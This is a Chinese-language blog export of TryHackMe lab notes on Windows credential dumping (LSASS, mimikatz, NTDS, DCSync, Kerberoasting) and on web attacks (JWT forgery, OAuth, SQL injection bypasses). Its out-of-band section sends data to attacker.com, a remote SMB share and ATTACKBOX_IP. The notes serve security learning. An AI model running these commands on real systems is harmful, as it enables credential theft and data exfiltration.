系统允许我们创建转储文件，即给定进程的快照。这可以通过桌面访问（图形用户界面）或命令提示符完成。这种攻击在 MITRE ATT&amp;CK 框架中被定义为 “OS Credential Dumping: LSASS Memory (T1003)“。 转储 LSASS首先是不借助工具的情况。直接任务管理器 -&gt; 右键创建 dump 文件。 12345678# 用 SysinternalsSuite DUMP lsass c:\\Tools\\SysinternalsSuite\\procdump.exe -accepteula -ma lsass.exe c:\\Tools\\Mimikatz\\lsass_dump # 用 mimikatz dump mimikatz.exe privilege:debug sekurlsa::logonpasswords #ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) 受害者必须登录进系统里，这个用户的凭证才会被缓存。 保护的 LSASS2012 年，微软实施了 LSA 保护措施，以防止访问 LSASS 从内存中提取凭证。 要启用 LSASS 保护，我们可以将 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa 中的注册表 RunAsPPL DWORD 值修改为 1。 12345678# 如果你是跟着 Room 走的，上面的命令会报错，你需要执行下面的命令 # 打开到工具目录 cd c:\\Tools\\Mimikatz ./mimikatz.exe # 关闭 LSA 保护 !+ !processprotect /process:lsass.exe /remove # 现在你就可以再跑一遍上面的步骤了 Windows 凭据管理器什么是凭证管理器？凭证管理器是 Windows 的一项功能，用于存储网站、应用程序和网络的登录敏感信息。它包含用户名、密码和互联网地址等登录凭据。有四个凭证类别： 网络凭证包含存储在互联网浏览器或其他应用程序中的身份验证详细信息。 Windows 凭据包含 Windows 身份验证详细信息，如 NTLM 或 Kerberos。 通用凭证包含基本身份验证详细信息，如明文用户名和密码。 基于证书的凭证： 这些是基于证书的身份验证详细信息。 访问凭据管理器可以直接在 GUI 上查看 (Control Panel -&gt; User Accounts -&gt; Credential Manager) ，或者使用 Microsoft Credentials Manager vaultcmd 工具。 123456# 显示系统里可用的的保险库 vaultcmd /list # 检查保险库里面存储的内容 VaultCmd /listproperties:&quot;Web Credentials&quot; # 列出凭据存储的更多信息 VaultCmd /listcreds:&quot;Web Credentials&quot; 转储凭据VaultCmd 无法显示密码，但我们可以依靠其他 PowerShell 脚本，如 Get-WebCredentials.ps1，它已包含在所附的虚拟机中，执行脚本时要带上 bypass 命令。 Bypass policy 指的是 PowerShell 的执行策略（Execution Policy）。 这是 PowerShell 的一项安全功能，旨在防止恶意脚本在未经用户许可的情况下运行。它有以下几种模式： Restricted：最严格的模式，不允许任何脚本运行。 AllSigned：只允许运行由可信发布者签名的脚本。 RemoteSigned：允许运行自己创建的本地脚本，但要求从网上下载的脚本必须经过签名。 Bypass：最宽松的模式，绕过所有执行策略，允许任何脚本运行，没有警告或提示。 12345powershell -ex bypass # 载入模块 Import-Module C:\\Tools\\Get-WebCredentials.ps1 # 导出 Web 凭证 Get-WebCredentials RunAs可以使用保存的凭据运行 RunAs 载入凭据 1234567# 查看保存的凭据 cmdkey /list # 使用 thm.red\\thm-local 凭据运行 cmd runas /savecred /user:thm.red\\thm-local cmd.exe type &quot;c:\\Users\\thm-local\\Saved Games\\flag.txt&quot; Mimikatz 提取密码用这个就可以直接提取明文密码了 123456c:\\Tools\\Mimikatz\\mimikatz.exe privilege::debug # 如果报错就用解锁 LSASS 方法跑一遍 # 导出凭据 sekurlsa::credman 域控这一节就讲了如何本地和远程提取域控的 Hash。 NTDS Domain Controller新技术目录服务 (NTDS) 是一个包含所有 Active Directory 数据（包括对象、属性、凭证等）的数据库。NTDS.DTS 数据由以下三个表组成： Schema table: it contains types of objects and their relationships. Link table: it contains the object’s attributes and their values. Data type: It contains users and groups. NTDS 默认位于 C:\\Windows\\NTDS，并已加密，以防止从目标计算机提取数据。从运行的机器访问 NTDS.dit 文件是不允许的，因为该文件被 Active Directory 使用并锁定。不过，有多种方法可以访问该文件。本任务将讨论如何使用 ntdsutil 和 Diskshadow 工具获取 NTDS 文件的副本，最后讨论如何转储文件内容。需要注意的是，解密 NTDS 文件需要使用系统引导密钥来尝试解密 LSA 隔离凭据，该凭据存储在 SECURITY 文件系统中。因此，我们还必须转储包含所有解密所需文件的安全文件。 NtdsutilNtdsutil 是一款 Windows 实用程序，用于管理和维护 Active Directory 配置。它可用于各种情况，如 恢复 Active Directory 中已删除的对象。 执行 AD 数据库维护 活动目录快照管理。 设置目录服务还原模式 (DSRM) 管理员密码。 参考 Microsoft documentation。 本地 Dump（无凭证）如果您没有可用的凭证，但有域控制器的管理员访问权限，通常会这样做。因此，我们将依靠 Windows 实用程序来转储 NTDS 文件并离线破解它们。首先，我们假设自己拥有域控制器的管理员权限。要成功转储 NTDS 文件的内容，我们需要以下文件： C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY 下面是一条单行 PowerShell 命令，使用 Ntdsutil 工具转储 C:\\temp 目录中的 NTDS 文件。 12345# 本地导出 NTDS powershell &quot;ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\\temp&#39; q q&quot; # 把文件传到自己的机器上运行 impacket 脚本 python secretsdump.py -security /home/kali/thm/20250808/SECURITY -system /home/kali/thm/20250808/SYSTEM -ntds /home/kali/thm/20250808/ntds.dit local 远程 Dump（有凭证）在上一节中，我们讨论了如何在没有凭证的情况下从内存中获取哈希值。在本任务中，我们将演示如何远程转储系统和域控制器哈希值，这需要密码或 NTLM 哈希值等凭证。我们还需要具有域控制器管理访问权限或特殊权限的用户的凭据。 DC SyncDC Sync 是在 Active Directory 环境中执行的一种流行攻击，用于远程转储凭据。当具有以下 AD 权限的账户（具有必要权限的特殊账户）或 AD 管理账户受到攻击时，这种攻击就会起作用： Replicating Directory Changes Replicating Directory Changes All Replicating Directory Changes in Filtered Set 攻击者会利用这些配置来执行域复制，通常称为 “DC Sync ”或 “域控制器同步”。 可以用 mimikatz 工具执行 DC Sync 攻击，不过这里用 Impacket SecretsDump 远程实现。 123456# 远程导出 NTDS 他还会导出 Kerberos 密钥 python secretsdump.py -just-dc THM.red/thm@10.201.48.121 # 会提示你输入密码 # 远程导出 NTLM python secretsdump.py -just-dc-ntlm THM.red/thm@10.201.48.121 Local Administrator Password Solution (LAPS)组策略首选项（Group Policy Preferences, GPP）Windows 操作系统有一个内置的管理员账户，可以通过密码访问。在拥有大量计算机的 Windows 环境中更改密码是一项挑战。因此，微软实现了一种方法，允许管理员使用组策略首选项（GPP）在所有工作站上更改本地管理员账户。 GPP 是一种工具，允许管理员创建包含嵌入式凭据的域策略。一旦部署了 GPP，SYSVOL 文件夹中会创建不同的 XML 文件。SYSVOL 是 Active Directory 的一个关键组件，它在 NTFS 卷上创建一个共享目录，所有经过身份验证的域用户都可以以读取权限访问。 问题在于，这些与 GPP 相关的 XML 文件中包含一个使用 AES-256 位加密的密码。在当时，这种加密强度被认为是足够的，直到微软不知何故在其 MSDN 网站上发布了私钥。由于域用户可以读取 SYSVOL 文件夹的内容，因此解密存储的密码变得轻而易举。用于破解 SYSVOL 加密密码的工具之一就是 Get-GPPPassword。 Local Administrator Password Solution (LAPS)2015 年，微软不再将加密密码存储在 SYSVOL 文件夹中。他们引入了 本地管理员密码解决方案（LAPS），这是一种更安全的远程管理本地管理员密码的方法。 这种新方法在 Active Directory 的计算机对象中添加了两个新的属性：ms-mcs-AdmPwd 和 ms-mcs-AdmPwdExpirationTime。ms-mcs-AdmPwd 属性包含本地管理员的明文密码，而 ms-mcs-AdmPwdExpirationTime 则包含密码的重置过期时间。LAPS 使用 admpwd.dll 来更改本地管理员密码并更新 ms-mcs-AdmPwd 的值。 12345678910111213141516# 检查 LAPS 是否开启 dir &quot;C:\\Program Files\\LAPS\\CSE&quot; # 检查是否有对 AdmPwd 可用的 cmdlets Get-Command *AdmPwd* CommandType Name ----------- ---- Cmdlet Find-AdmPwdExtendedRights Cmdlet Get-AdmPwdPassword Cmdlet Reset-AdmPwdPassword Cmdlet Set-AdmPwdAuditing Cmdlet Set-AdmPwdComputerSelfPermission Cmdlet Set-AdmPwdReadPasswordPermission Cmdlet Set-AdmPwdResetPasswordPermission Cmdlet Update-AdmPwdADSchema 可以使用 -Identity * 参数列出所有可用的 OU。 12345678910111213141516# 找哪个 AD OU 拥有处理 LAPS 的 “所有扩展权限 ”属性 Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} # 检查组 net groups &quot;LAPsReader&quot; Members ------------------------------------------------------------------------------- bk-admin # 获取 bk-admin 用户权限后，可以用下面这个命令获取 LAPS 密码 Get-AdmPwdPassword -ComputerName creds-harvestin 需要注意的是，在实际的 AD 环境中，LAPS 只在特定的计算机上启用。因此，您需要枚举并找到正确的目标计算机以及正确的用户账户，才能获取 LAPS 密码。有很多脚本可以帮助实现这一点，但我们在 C:\\Tool 中包含了 LAPSToolkit PowerShell 脚本，可以试用一下。 其他攻击方式KerberoastingKerberoasting 是一种常见的 AD 攻击，用于获取有助于持久性的 AD 票据。要使这种攻击奏效，攻击者必须能访问 SPN（服务主名）账户，如 IIS User、MSSQL 等。Kerberoasting 攻击涉及请求 Ticket Granting Ticket (TGT) 和 Ticket Granting Service (TGS)。这种攻击的最终目的是实现权限升级和横向网络移动。让我们快速演示一下该攻击。首先，我们需要找到 SPN 账户，然后发送请求以获取 TGS 票据。我们将使用 GetUserSPNs.python 脚本从 AttackBox 执行 Kerberoasting 攻击。 12345678# SPN 枚举 python GetUserSPNs.py -dc-ip 10.201.48.121 THM.red/thm # 请求 TGS 票据 python GetUserSPNs.py -dc-ip 10.201.80.121 THM.red/thm -request-user svc-thm # 爆破 TGS hashcat hash.txt rockyou.txt AS-REP RoastingAS-REP Roasting 是一种使攻击者能够检索账户选项设置为“不需要 Kerberos 预验证“的 AD 用户密码哈希值的技术。 该选项依赖于旧的 Kerberos 身份验证协议，该协议允许在没有密码的情况下进行身份验证。 获得哈希值后，我们可以尝试离线破解，最后，如果可以破解，我们就得到了密码！ 1python GetNPUsers.py -dc-ip 10.201.80.121 thm.red/ -usersfile /tmp/users.txt 还有一些玩过的： SMB 中继 LLMNR &#x2F; NBNS 投毒 总结其实主要就那几个方向，收集用户机器上的密码，比如说密码管理器，浏览器，转储 LSASS。之后呢，拿到了权限可以用 dcsync 拿下金票，那些 LAPS 不太懂，估计碰不上。 可以尝试使用以下工具来扫描目标机器。 Snaffler Seatbelt Lazagne","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"},{"name":"Active Directory","slug":"Active-Directory","permalink":"https://blog.irec.moe/tags/Active-Directory/"}]},{"title":"Try Hack Me - Web Application Pentesting","slug":"THM/20250717_Web_Application_Pentesting/Web_Application_Pentesting","date":"2025-07-16T16:00:00.000Z","updated":"2025-08-30T00:37:24.140Z","comments":true,"path":"/thm_wap.html","permalink":"https://blog.irec.moe/thm_wap.html","excerpt":"","text":"前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。 可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整理的，有自己的理解的文字。 枚举与暴力破解认证枚举的目的 鉴别有效用户名 密码规则 常见枚举地方 注册页 可以看到用户名或者密码被使用了没有 密码重置功能 通过后端的反应来判断用户名是否存在 错误信息 数据泄露 比如说一个人的信息肯定会有复用的地方 通过详细错误枚举用户邮箱可以从系统详细错误里面容易泄露的有： 内部路径 数据库详情 用户信息 诱发详细错误的方法： 无效的登录 试着输一点错误的用户名和密码试试 SQL 注入 文件包含、路径穿越 篡改表单 Fuzz 通过登录功能，如果提示邮箱不存在，则可以通过遍历邮箱来找到存在的邮箱地址。 通过密码重置的逻辑来破解一般密码重置有以下几种方法 基于邮箱的重置 基于安全问题的重置 基于短信的重置 而每个方法都有他的弱点 可预测的 Token token 有规律，或者 token 可以被爆破，也就是有效性没有做限制 Token 有效期 校验强度不够 比如说问题太常见了 信息泄露 会泄露用户名或者邮箱，以提供更多线索 不安全的传输 没用 HTTPS，可能会被劫持 其他后面的就是一个爆破密码重置 token，和一个爆破 HTTP Basic 认证的。然后说了一下信息收集的手段，网页时光机和搜索引擎的语法。 Session 管理这一章就说了一下 Cookie 和 Session 的区别，然后演示了一下客户端这边改 session 字段达到垂直越权。 JWT 安全JSON Web TokensJWT 结构JWT 由三部分组成，每部分都是由 Base64Url 编码的，用 . 隔开。 头部 通常表示了这是什么类型的 token 和用了哪种加密算法 载荷 是 token 的主体，里面包含 claims。 claims 是为特定实现提供的一条信息。在 JWT 中有注册声明，以及公共和私有声明。 签名 签名是验证 token 有效性的一种方法，签名所用的算法在头部中有写明 签名算法 None 字面意思，没有算法，实际上是一个没有签名的 JWT 对称签名 HS256，他会使用一个共享的密钥 (secret key) 来计算 JWT 的头部和载荷的哈希值。 签名包含的内容：Base64Url 编码后的头部 + 一个点 (.) + Base64Url 编码后的载荷 不对称签名 RS256，先生成 hash，然后用私钥加密这个 hash。 敏感字段泄露 敏感信息被直接包含在 JWT 的 payload 中。比如 password 和 flag 这样的敏感数据，不应该被直接放到 JWT 中，因为 JWT 会被发送到客户端。由于 JWT 的 payload 只是经过 Base64 编码，未加密，任何拿到 JWT 的人都可以轻易解码并查看其中的内容。 后端不应盲目信任 payload 中的敏感数据。服务器端在收到 JWT 并验证其签名后，不应该直接使用 payload 中可能包含的敏感信息（如 password 或 flag）。这些敏感信息不应由客户端提供。 正确的做法是从后端数据库中查找敏感数据。当服务器需要这些敏感信息时，它应该从 JWT 中提取非敏感的用户标识符（比如 username），然后使用这个标识符去自己的后端数据库中安全地查询并获取真正的敏感数据（比如用户的权限、角色、flag 值等）。 签名验证错误不验证签名利用签名未验证漏洞进行攻击正如你所说，攻击者利用这个缺陷的方式就是： 篡改 payload 内容： 攻击者可以修改 JWT payload 中的任何信息，例如将 admin 字段从 0 改为 1。 删除或忽略签名： 因为服务器根本不验证签名，所以攻击者甚至可以删除 JWT 的签名部分（第三部分），或者直接随便填一个错误的签名，服务器仍然会接受。 冒充高权限用户： 攻击者可以伪造一个 admin: 1 的 JWT，然后冒充管理员用户进行请求，从而达到获取敏感信息（如 flag）的目的。 修复方案修复这个漏洞的方法非常直接和关键：始终验证 JWT 签名。 1payload = jwt.decode(token, self.secret, algorithms=&quot;HS256&quot;) 通过提供 secret（对于对称签名算法如 HS256）或 public key（对于非对称签名算法如 RS256），JWT 解码库会强制进行签名验证。 只有当 JWT 的签名是使用正确的密钥生成的，且 JWT 的头部和载荷内容与签名匹配时，jwt.decode 才会成功，否则会抛出验证错误。 签名可被降级核心漏洞：签名可被降级到 None 简单来说，这个漏洞允许攻击者： 修改 JWT 头部 (header) 中的 alg (algorithm) 字段为 None。 将修改后的 JWT 发送给服务器。 如果服务器端的 JWT 验证库没有正确处理 None 算法（特别是当它没有显式地拒绝 None 算法或者没有指定一个允许的算法列表时），它可能会错误地跳过签名验证，并认为这个“未签名”的 JWT 是有效的。 开发者的错误： 问题在于开发者没有正确地实现验证逻辑： 没有锁定算法： 开发者可能没有强制要求只能使用特定的签名算法（例如 HS256）。 没有拒绝 None 算法： 他们的代码可能没有明确地拒绝 None 算法，导致库在遇到 None 时，默认跳过签名验证。 动态读取 alg： 文中提到的“开发者的错误”示例就是： 123header = jwt.get_unverified_header(token) # 获取未验证的头部 signature_algorithm = header['alg'] # 读取攻击者控制的 alg 字段 payload = jwt.decode(token, self.secret, algorithms=signature_algorithm) # 用这个 alg 去解码 这种方式让攻击者通过控制 alg 字段，来控制服务器用来验证签名的算法。当攻击者将 alg 改为 None 时，jwt.decode 函数会接收到 algorithms=None，从而导致签名验证被绕过。 修复方案修复方法很简单：在调用 JWT 解码函数时，显式地提供一个允许的签名算法列表。 1payload = jwt.decode(token, self.secret, algorithms=[&quot;HS256&quot;, &quot;HS384&quot;, &quot;HS512&quot;]) 通过这种方式，即使攻击者将 JWT 头部中的 alg 字段改为 None，或者任何不在 [&quot;HS256&quot;, &quot;HS384&quot;, &quot;HS512&quot;] 列表中的算法，jwt.decode 函数也会抛出错误，拒绝该 JWT，因为它只接受明确指定的安全算法。 文中的 Pyjwt 库也对此进行了安全增强，当指定了 secret 但 alg 为 None 时会抛出异常，这是防止此类攻击的一种内置保护。 总而言之，这个例子完美展示了 “最小权限原则” 在代码层面的体现：只允许明确的安全算法，而不是盲目信任 JWT 头部中声明的算法。这是防止 JWT 伪造的关键防御措施之一。 弱对称密钥因为对称密钥的使用，所以 JWT 的安全性就依赖密钥的熵和长度了。因为对称密钥是可以恢复的，所以密钥一旦泄露，就导致数据的安全性得不到保障了。 JWT 算法混淆攻击核心漏洞点：后端 JWT 验证库的实现错误，将非对称算法的公钥错误地用作对称算法（HS256）的密钥。 攻击流程分解 原始服务器设置： 服务器最初使用 RS256（非对称） 算法来签名 JWT。这意味着服务器有一个私钥（用于签名）和一个公钥（用于验证）。这个公钥是公开的。 服务器的验证逻辑可能允许多种算法，包括 RS256 和 HS256，并且错误地处理了密钥类型。 攻击者的操作： 步骤 1：获取原始 JWT 和公钥。 攻击者通过认证获得一个合法的 JWT。 攻击者也获得了服务器的公钥。 （通常通过 API 或证书是公开可获取的）。 步骤 2：篡改 JWT 的头部。 攻击者将 JWT 头部中的 alg 字段从 RS256 修改为 HS256。 攻击者同时可以修改 payload 中的任何内容（比如将 admin:0 改为 admin:1）。 步骤 3：使用服务器的公钥作为 HS256 的“秘密密钥”来签名伪造的 JWT。 这是最关键的一步。由于攻击者知道了服务器的公钥，他们就使用这个公钥作为 HS256 的秘密密钥来对篡改后的 JWT 头部和载荷进行签名。 记住：HS256 签名算法的特点是，签名和验证都使用同一个密钥。 服务器端的错误验证逻辑（漏洞所在）： 当服务器接收到这个被篡改的 JWT 时，它会读取 alg 字段，发现它是 HS256。 此时，有缺陷的 JWT 验证库会发生混淆：它本应该使用一个真正的 HS256 秘密密钥来验证签名。但是，由于它的实现缺陷，它错误地将原本用于验证 RS256 的公钥（这个公钥在服务器端是已知的）当作了 HS256 的“秘密密钥”。 服务器现在用这个“（伪装成）HS256 密钥的公钥”来验证 JWT 的签名。 攻击成功： 攻击者在步骤 3 中，就是用这个公钥作为“秘密密钥”来生成 HS256 签名的。 服务器现在用同一个公钥作为“秘密密钥”来验证签名。 因为用于签名和验证的“密钥”是同一个（都是服务器的公钥），所以签名验证成功！ 总结 这种攻击的本质是签名算法混淆，利用了 JWT 验证库在处理不同算法类型时的逻辑缺陷，特别是当允许混用对称和非对称算法时。攻击者不需要破解私钥，也不需要知道真正的 HS256 秘密密钥，只需要利用服务器公开的公钥就能伪造签名。 修复方案12345678header = jwt.get_unverified_header(token) algorithm = header[&#39;alg&#39;] payload = &quot;&quot; if &quot;RS&quot; in algorithm: # 如果是RS算法，则明确用公钥验证 payload = jwt.decode(token, self.public_key, algorithms=[&quot;RS256&quot;, &quot;RS384&quot;, &quot;RS512&quot;]) elif &quot;HS&quot; in algorithm: # 如果是HS算法，则明确用秘密密钥验证 payload = jwt.decode(token, self.secret, algorithms=[&quot;HS256&quot;, &quot;HS384&quot;, &quot;HS512&quot;]) 这个修复的关键在于： 根据 JWT 头部声明的 alg 字段，明确区分是使用 public_key 还是 secret 进行验证。 同时，algorithms 参数还限制了只允许特定范围的算法，避免了 None 算法降级。 有效期如果 JWT 中没有设置 exp (expiration time) 声明，或者 exp 值设置得过大，那么这个 JWT 就可能是永久有效的，或者有效期过长。 exp (Expiration Time) 声明的重要性： 在验证 JWT 签名之前，一个重要的步骤是检查 JWT 的生命周期。这通常是通过读取 payload 中的 exp（过期时间）声明来完成的。 如果当前时间超过了 exp 指定的时间，那么 JWT 应该被认为是无效的。 exp 值过大或缺失的问题： exp 值设置太大： 即使设置了 exp，但如果过期时间被设置得非常遥远（比如几十年后），那么这个 JWT 实际上也接近于永久有效。 exp 值未设置： 如果 JWT 的 payload 中根本没有 exp 这个声明，那么大多数 JWT 库在默认情况下，只要签名验证通过，就会认为这个 token 是永久有效的，因为它没有一个明确的过期时间来拒绝它。 后果： 这种“永久有效”或“超长有效期”的 JWT 存在巨大的安全风险。如果一个用户的 JWT 被泄露（例如，通过会话劫持、XSS 攻击、用户设备丢失等），攻击者就可以无限期地使用这个泄露的 JWT 来冒充合法用户，直到服务器端采取其他方式（如密钥轮换、IP 白名单等）来使其失效。 JWT 与传统 Cookie 的区别： Cookie： 传统的会话管理中，服务器可以在任何时候通过使服务器端的会话失效（例如，从数据库中删除会话记录）来“吊销”一个 Cookie。 JWT： JWT 的设计理念是无状态 (stateless) 和 去中心化 (decentralized)。一旦 JWT 被签发并发送给客户端，服务器就不再存储其状态。这意味着，如果你想在 exp 时间之前使一个 JWT 失效，你就必须维护一个黑名单 (blocklist &#x2F; denylist) 来记录所有被吊销的 JWT。维护黑名单会增加服务器端的复杂性，并且在一定程度上打破了 JWT 无状态的优势。 选择正确的 exp 值： 因此，选择一个合适的 exp 值非常关键，它应该根据应用程序的敏感性和功能来确定。 例如，银行应用（高度敏感）的 JWT 可能只有几分钟的有效期，而邮件服务器（相对不那么敏感）的 JWT 可能有几个小时甚至几天的有效期。 刷新令牌 (Refresher Tokens)： 刷新令牌是一种常见的解决方案，用于解决 JWT 有效期短和用户体验之间的平衡问题。 它通常配合一个短期有效的 access token（用于每次请求）和一个长期有效的 refresh token（用于在 access token 过期后获取新的 access token）。 refresh token 通常只在少数特定端点使用，并且可以被服务器端存储和吊销。 开发错误与修复 错误： 没有在 JWT 的 payload 中包含 exp 声明，导致 token 永久有效。 修复： 在签发 JWT 时，务必在 payload 中添加 exp 声明，并将其设置为一个合理的、有限的时间。大多数 JWT 库在解码时会自动检查这个 exp 声明。 跨服务中继攻击简单来说是一个 API 的 JWT 可以在另外一个 API 上作用，原因是 JWT 没有验证 audience 字段 1payload = jwt.decode(token, self.secret, audience=[&quot;appA&quot;], algorithms=&quot;HS256&quot;) OAuth 漏洞OAuth 实际上是调用第三方&#x2F;第一方的认证接口，比如说 QQ 快捷登录，拿到用户的在第三方&#x2F;第一方的凭证，这样我们作为调用方就有用户的相关信息和凭据了，然后我们再拿着用户的凭据(token)去调用相关需要凭证才能调用的接口，这样就是一个 OAuth 过程了。 里面容易存在的漏洞我觉得主要还是在那个 token 本身。 关键概念Resource Owner字面意思，就相当于在软件开屏的时候，提示你是否授权给应用程序，这时你就是你的资源所有者。 ClientClient 在 OAuth 流程中，是指代表资源所有者（用户）向授权服务器请求访问受保护资源的应用程序。 Authorization Server在成功认证之后，颁发 token 给 client，还有一点就是问你是否允许客户端访问你的数据。 Resource Server就相当于数据库了，这里的意思是托管着用户的受保护资源，要有有效的 token，才会返回数据。 Authorization Grant主要的同意类型有 Authorization Code, Implicit, Resource Owner Password Credentials, and Client Credentials. Access Token短效，通常使用范围受限。 Refresh Token用来生成 access token 的，长效。 Redirect URI是授权服务器在完成用户认证和授权后，将用户的浏览器重定向回去的“客户端应用的接收地址”。 对于 URI 应该会有强校验，不然就随便跳了。 Scope权限范围吧。 State Parameter在请求登录的时候，跳到 OAuth 时会发一个 state，服务器返回一个 state，客户端会比对这个 state 是否一样。 如果是 CSRF 请求的话，总得要跳过去得到用户授权，如果直接请求的话那拿不到，就相当于一次请求是带了个验证码。 Token &amp; Authorization Endpoint认证的两个 API 吧，一个负责用户认证，一个负责颁发 Token。 Grant Types有好多种，主要是熟悉一下那些数据流，看看图片就理解了。 鉴别 OAuth 框架 看 HTTP 头和响应 看源码 js 库 看 URL 有固定格式，特征 看错误信息 偷 OAuth Tokenredirect_url 没有被保护攻击者可以构造 OAuth 链接然后诱导用户点击，token 被发到伪造的 URL 去（因为跳转链接就是携带 token 过去的地方） 缺 state攻击者构造一个属于自己账户的认证链接，诱导用户点击。本来正常的认证是要带一个 state 参数的（这个参数是存在用户本地的，攻击者拿不到），但是因为认证服务器的问题，不检验这个字段，导致 token 点击就送。 隐式授权流token 会显示在 url 中，攻击者可以构造 XSS，去偷 token。 MFA主要就是请求带验证码，密码验证之后能绕过，OTP 爆破。 Hammer这一关感觉比较难了…因为那个 session 有尝试有效期，刚开始在 burp 里面折腾更新 cookie 很久，后面发现那样执行的话还是有失效的可能。转而写 python 脚本，单线程在慢慢跑。 Advanced SQL Injection讲了一些二次注入的技巧，靠二次查询触发 SQL 注入，也就是把 SQL 语句拼接在那个查询 SQL 语句的后面 SQL 绕过技巧字符编码 URL 编码 ‘ OR 1&#x3D;1– can be encoded as %27%20OR%201%3D1– 八进制编码 SELECT * FROM users WHERE name &#x3D; ‘admin’ can be encoded as SELECT * FROM users WHERE name &#x3D; 0x61646d696e Unicode 编码 admin can be encoded as \\u0061\\u0064\\u006d\\u0069\\u006e 可以用 || 替代 OR 12Intro to PHP&#39; || 1=1 --+ Intro%20to%20PHP%27%20%7C%7C%201=1%20--+ 这里其实利用的是两个字符串与操作，只要有一个为真这个结果永远为真。 在 URL 编码 中 %20 和 + 等价，都是表示空格。 没有引号的 SQL 注入 使用数值 找一些不需要引号的注入点，直接用 OR 1&#x3D;1 使用 SQL 注释 用 -- 我不太明白实际的用法，感觉更多的是让他去报错，因为注释掉了后面的话，语句都没有闭合了，肯定报错。 使用 CONCAT() CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin 不允许空格 注释代替空格 use SQL comments (/**/) to replace spaces Tab 或者换行符 using tab (\\t) or newline (\\n) 替代字符 such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space) 题目中 OR 也被过滤了，用 CONCAT 没用，最后还是用的两个 |，空格用 %09 代替。 11%27%09||%091=1%09--%09 一些场景，可以给你绕过一些思路 Scenario Description Example Keywords like SELECT are banned SQL keywords can often be bypassed by changing their case or adding inline comments to break them up SElEcT * FrOm users or SE&#x2F;&#x2F;LECT * FROM&#x2F;&#x2F;users Spaces are banned Using alternative whitespace characters or comments to replace spaces can help bypass filters. SELECT%0A*%0AFROM%0Ausers or SELECT&#x2F;&#x2F;*&#x2F;&#x2F;FROM&#x2F;**&#x2F;users Logical operators like AND, OR are banned Using alternative logical operators or concatenation to bypass keyword filters. username &#x3D; ‘admin’ &amp;&amp; password &#x3D; ‘password’ or username &#x3D; ‘admin’&#x2F;&#x2F;||&#x2F;&#x2F;1&#x3D;1 – Common keywords like UNION, SELECT are banned Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters. SElEcT * FROM users WHERE username &#x3D; CHAR(0x61,0x64,0x6D,0x69,0x6E) Specific keywords like OR, AND, SELECT, UNION are banned Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments. SElECT * FROM users WHERE username &#x3D; CONCAT(‘a’,’d’,’m’,’i’,’n’) or SElEcT&#x2F;&#x2F;username&#x2F;&#x2F;FROM&#x2F;**&#x2F;users 带外注入不同数据库的使用方法MYSQL可以写文件出来，然后用其他方式去访问这个文件 1SELECT sensitive_data FROM users INTO OUTFILE &#39;/tmp/out.txt&#39;; MSSQL主要用的是 xp_cmdshell 1EXEC xp_cmdshell &#39;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\\\10.10.58.187\\logs\\out.txt&quot; -c -T&#39;; Oracle1234567DECLARE req UTL_HTTP.REQ; resp UTL_HTTP.RESP; BEGIN req := UTL_HTTP.BEGIN_REQUEST(&#39;http://attacker.com/exfiltrate?sensitive_data=&#39; || sensitive_data); UTL_HTTP.GET_RESPONSE(req); END; 实战在 mysql 中，如果 secure_file_priv 被设置的话，写入文件的目录就被限制住了 用这个命令开无密码共享 12# SMB 开本地共享 python github/impacket/examples/smbserver.py -smb2support -comment &quot;My Logs Server&quot; -debug logs /tmp 这是一个带外注入写 SMB 的实例。 11&#39;; SELECT @@version INTO OUTFILE &#39;\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt&#39;; -- 其他技术HTTP 头注入一些可能会把 HTTP 头的一些数据写进数据库，这就造成了注入点了。 比如 UA, Referer, X-Forward-For。 1curl -H &quot;User-Agent: &#39; UNION SELECT username, password FROM user; # &quot; http://10.10.115.31/httpagent/ 12345678910111213&#39; UNION SELECT 1,database() ; # &quot; result: library &#39; UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;library&#39; ; # result: books,logs,user,visitor &#39; UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;books&#39; ; # result: book_id,ssn,book_name,author,book_id,book_name,author,flag &#39; UNION SELECT 1,group_concat(book_id,&quot;::&quot;,book_name,&quot;::&quot;,author,&quot;::&quot;,book_id,&quot;::&quot;,book_name,&quot;::&quot;,author,&quot;::&quot;,flag SEPARATOR &#39;&lt;br&gt;&#39;) FROM books ; # 最佳实践代码方面参数化查询和预处理语句使用带参数的查询和预编译语句可以让用户的所有输入变成数据而不是可执行的语句。 12$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = :username&quot;); $stmt-&gt;execute([&#39;username&#39; =&gt; $username]); 像这样就提前把 SQL 语句传给服务器了，服务器只接受一个 username 字段，然后只把输入当成字符处理。 输入校验和处理Use built-in functions such as htmlspecialchars() and filter_var() in PHP to sanitise inputs effectively. 最小权限原则避免用高权限数据库账户操作数据库 存储过程封装 SQL 逻辑 定期安全审计和代码审查不用说 SQL 注入高级技巧以下是一些渗透测试人员在面对 SQL 注入漏洞时，常用的更高级的利用手法： 利用特定数据库功能不同的数据库管理系统（DBMS），如 MySQL、PostgreSQL、Oracle 和 MSSQL，都有自己独特的功能和语法。渗透测试人员需要了解目标 DBMS 的具体特性才能有效地利用它们。例如，MSSQL 支持 xp_cmdshell 命令，它能被用来执行操作系统命令，这允许攻击者在数据库服务器上运行系统级别的指令。 